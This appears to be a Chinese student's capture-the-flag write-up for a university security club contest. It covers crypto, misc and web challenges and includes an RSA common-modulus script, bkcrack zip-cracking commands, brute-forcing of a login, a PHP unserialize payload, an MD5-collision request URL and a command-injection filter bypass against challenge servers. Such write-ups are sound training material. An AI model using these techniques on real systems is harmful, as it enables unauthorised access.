---
title: 齐鲁师范学院网络安全社团2025级第二次校赛 WriteUP
url: https://mp.weixin.qq.com/s/ADfRscx0fsktFgUeeFybnQ
source: Doonsec's feed
date: 2026-04-12
fetch_date: 2026-04-13T04:53:31.961452
---

# 齐鲁师范学院网络安全社团2025级第二次校赛 WriteUP

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Hjtlibzdr5X8k9Mqhu7iagy8ibfPk6E6tWFo5zXr5I4CNCeqSErafFGQWnlGHXm8PUDabHZXMZ0FOnIHqgKQ3iaXsQgo7vTmOVibmLmUOK5JGPc4/0?wx_fmt=jpeg)

# 齐鲁师范学院网络安全社团2025级第二次校赛 WriteUP

原创

小志z
小志z

志在片语

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 这一次比赛禁止AI 不能用AI的我根本不会写脚本 Re和Pwn直接寄了 剩下的侥幸ak

![image-20260412193208690](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5XicoL0RAFNkYialYqWEcUWHOF2b74D7nOa2Qsxpz5HjFUd8NuKMc2rwT3pg0N8rnwWg0cytEw4swVkjsDYY1kRQEUfjO0oKgxnBE/640?wx_fmt=png&from=appmsg "null")

## Crypto

### **Affine**

**出题人：** Camille **难度：** 简单

---

银河中的智慧会帮助你揭开谜底

题目是说的银河 所以是银河字母

![image-20260412133704956](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5XibpVg8N97iazNZPuayVUodJE9NkbDrvPickib0My7INNr6XdVmjlTVedicG9TJQX8XrzGWpt0TTdXziccYXbqVkicN0JzLicK7Jumibvqs/640?wx_fmt=png&from=appmsg "null")

将密文解码出来大概是以下的形式

```
HURXREHSHNIHXURI
```

根据题目提示为Affine密码 将base64解密后得到a和b的值

![image-20260412133833188](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5X80GuEwNzianUpgzkjSkKfTlIQjmhMLo6d1uqbY6AjBQgdy7zbHXHXoEUicZrUVPwNQvlRaPTicNDdwHADwE0BJJxyjLZAt8rdSGg/640?wx_fmt=png&from=appmsg "null")

再用仿射密码解密一下

![image-20260412133853308](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5XicREmFyzakLsA7kY7Nal6qzVTqOKOXqDibERlKrOgxV9ZteTg99gBj4rwA1RI9jTxoXocp9pys0KhKqDIEVcgsOhNuTnptIy5Ns/640?wx_fmt=png&from=appmsg "null")

拼接flag可以得到QLNUCTF{a\_new\_era\_has\_dawned}

### **Easy\_Rsa**

**出题人：** Camille **难度：** 简单

---

不多说

这道题是RSA共模攻击

```
from Crypto.Util.number import long_to_bytesfrom gmpy2 import gmpy2
n = 105264465119825392930270074121640512414080601856155883822015757324007538189539606533449835377680756134498279412425583951618073447773969564119838117072693083034020041459171374649087604252784561860797248953931468997653718991863888529042762228719908173798022752915524761995087438171110499736790192741730648757013e1 = 65537e2 = 17c1 = 7762426765215220050207308755375681429229991310010906243953366767274715308639585428003818300312778958077467852911313292748305091182273555515598092752323863574075057919591320510654361867634028916993895458994735520673276142745120689132573003445818645866828964106930924421070592373074717182262964215821968638132c2 = 43966542847334009211385474563372505170806758926763748156802941100166035733810602321346239377467987870181474256465226598440604570526109882567946520089474248025554071431488069180252144800218664214625618038215721088549654598902771082779678313860579377658178077667829707876096837137917598108366277814449122513223
r,s1,s2 = gmpy2.gcdext(e1, e2)m = (pow(c1,s1,n)*pow(c2,s2,n)) % nprint(long_to_bytes(m))
```

getflag

![image-20260412142437839](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5XibG8wiboZicTV2UWbm8eBNSNAuWpcxddL0Weib9YPQic2Sy4V80eMaCdLngKlvziauxRxyXuwYYgMHLWHAKEKicgPU1X6uonUp7aic0iaY/640?wx_fmt=png&from=appmsg "null")

### **真理**

**出题人：** Camille **难度：** 简单

---

永恒不变的唯一真理

打开是核心价值观编码 解码即可 然后从中找到对的格式 getflag

![image-20260412134702553](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5XibBukwS1oSPJiaSKtiaglzK23WA80FJfqXjNZNQib3gs4mOpg5ZC5El6Esct2UCjh3wic47UfffKIpdGOzOUQf8pbQM4dsRyFhc9Ds/640?wx_fmt=png&from=appmsg "null")

## Misc

### **眼睛快瞎了**

**出题人：** Duktig | **难度：** 简单

---

这个 GIF 闪得太快了，我根本看不清上面写了什么！

这个题目提示的很到位 其实就是拆分gif

![image-20260412134118848](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5X9vVApC8jr6KgWhun8ZwC8vbKVdLDfKzMT6VncFNhwxh2TntWRkCDvpvViaw2t5ZzxfZBQwmB7OoU59Rutx1Cy5xg8fmqkCndfY/640?wx_fmt=png&from=appmsg "null")

然后拼接一下

![image-20260412134134097](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5XibAcjgES5wVloNnuPBObPWwx7WYNr4384cbMuDsDjRHAibUmcAIzEuyEAfxbFeFxjSu5kGx3BhNJp3ftjMS3MuXmtIoLsaHeua0/640?wx_fmt=png&from=appmsg "null")

QLNUCTF{GIF\_Frames\_S0\_Many}

### **超标的体重**

**出题人：** Duktig **难度：** 简单

---

这张图片看起来很普通，但它的“体重”似乎超标了。里面是不是藏了什么东西？

用zip打开图片 发现里面有个flag.txt 解压打开即可 getflag

![image-20260412134854322](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5XibtbGickR6nK6qq4UmLMVXmnMltPiblRyWfn7FaTZdIvpqG0OKIJTwg7W6Og1uYe198fJWgx9XjMwYrFTEdZtzgoHuVlicq5HU5sY/640?wx_fmt=png&from=appmsg "null")

### **伪装者的套娃**

**出题人：** Duktig | **难度：** 中等

---

这是一个被多重加密的压缩包，已知其中一个文件 readme.txt 的内容是全校学生都知道的校训。

这个是一个已知道明文攻击题 用bkcrack做 先解出来keys 然后我强制改了一下密码

```
PS C:\Users\Ambit\Desktop\bkcrack-1.8.1-win64> .\bkcrack.exe -C .\flag.zip -c readme.txt -p readme.txt -P readme.zipbkcrack 1.8.1 - 2025-10-25[16:36:42] Z reduction using 32 bytes of known plaintext100.0 % (32 / 32)[16:36:43] Attack on 257437 Z values at index 6Keys: 48ad034b 76220f1e eeef6a2c2.5 % (6517 / 257437)Found a solution. Stopping.You may resume the attack with the option: --continue-attack 6517[16:36:46] Keys48ad034b 76220f1e eeef6a2c
PS C:\Users\Ambit\Desktop\bkcrack-1.8.1-win64> ./bkcrack -C .\flag.zip -k 48ad034b 76220f1e eeef6a2c -U new.zip easypasswordbkcrack 1.8.1 - 2025-10-25[16:37:40] Writing unlocked archive new.zip with password "easypassword"100.0 % (2 / 2)Wrote unlocked archive.
```

解压后得到flag

![image-20260412164112066](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5X95H4PIib4dJicMx2u3ibQkuCWb3SK18sb4THEmDnR86Z0uVgh7FliaqRb2vic8ibnQAjlDX6WyvDGA6Rg0WDOj9kF0EvlJAglv8TdMM/640?wx_fmt=png&from=appmsg "null")

## Web

### **game**

**出题人：** Ord1nary **难度：** 简单

---

比赛打累了玩会小游戏放松一下吧

这个一开始是个登录框 yakit用top10000发包就行

![image-20260412140223825](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5X9pwz9IKWFicDLY3ESVD5ibCsnJ9oGlnJBScJdntoI4wZicFgTmYttkEbFH5XgbzUcz6e5OKuXTVRBSePm9zgFu0icoARJPzP9R4Ko/640?wx_fmt=png&from=appmsg "null")

用admin 密码abc123登录 直接在前端就能看见flag 没有后端校验

![image-20260412140254042](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5X9vO1ibF5fA8jvBbURPd1J4mMH3PhV5GjQibYEKuNf13sibDlpA1ZdrNofTyibLkzudwbzaB8HwAh1HiaFWicCTCUoic3iblMdZGdCibibXg/640?wx_fmt=png&from=appmsg "null")

### **ez\_unserialize**

**出题人：** Ord1nary **难度：** 简单

---

了解一下反序列化

之前真的不会 全是ai的 这一次手敲明白原理了

```
<?phpclass SimpleAuth{public $user = 'admin';public $pass = 'thi5_1s_s3cr3t';public function __wakeup(){}}$a = new SimpleAuth();print(serialize($a));?>
```

执行php 然后传参即可

![image-20260412144558252](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5X9cvycjsicIYBxz6WLGLqvCdShc7FZcCM87OO1o2r2SpkhAPnpThiaScM840WPEuGjk3zDeliajvTghDDo7EicyCkFphDg6vNxYPrw/640?wx_fmt=png&from=appmsg "null")

### **md5开胃菜**

**出题人：** Ord1nary **难度：** 中等

```
<?phperror_reporting(0);highlight_file(__file__);include('next.php');if (isset($_GET['md5_1']) && isset($_GET['md5_2'])) {    if ((string)$_GET['md5_1'] !== (string)$_GET['md5_2'] && md5($_GET['md5_1']) === md5($_GET['md5_2'])) {        if (isset($_POST['md5_3']) && md5($_POST['md5_3']) == '0') {            echo $next;        } else {            echo "你以为只是简单的md5吗";        }    } else {        echo "这都不会了？";    }} else {    echo "md5起手试一下吧";}
```

md5强比较 请求以下url 发送post md5\_3=0e215962017

```
http://challenges.snige.cn:35798/?md5_1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&md5_2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

回显

![image-20260412150232899](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5X8v0tyYjmKqcY5uDRianM665JFfwNdl2oX2qYDut9fGJC6EU7L9pLJJ8HCMKwAXwufypYyB8j2BVDa6uGf1diaNCqhR19SkkBO4w/640?wx_fmt=png&from=appmsg "null")

进入lv2.php

```
<?phperror_reporting(0);highlight_file(__FILE__);$shell = $_POST['shell'];$cmd = $_GET['cmd'];if(preg_match('/f|l|a|g|\*|\?/i',$cmd)){    die("Hacker!!!!!!!!");}eval($shell($cmd));
```

根据php传参 先用dir 列出目录 发现flag在根目录上

![image-20260412153146580](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5XibNqUnPWhWFLbwzq8wDZr8viaqfibpnlf899eNLBnrxBPPic1nLuaDuwdFJgeALrxCB3eYDMLF2d05O0j2vhO6H7N8GJ3mFNm8dzU/640?wx_fmt=png&from=appmsg "null")

使用通配符进行绕过 getflag

![image-20260412161221886](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5X8IUa5aYuic9F8huvvNL3CSIXzLXluoVHicF2NqIVeMelP8dhRbEPJpdNic2f0zMRKyGdRXH6yTCLoOg6mibFjQUqgnbNW813JsIgw/640?wx_fmt=png&from=appmsg "null")

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_...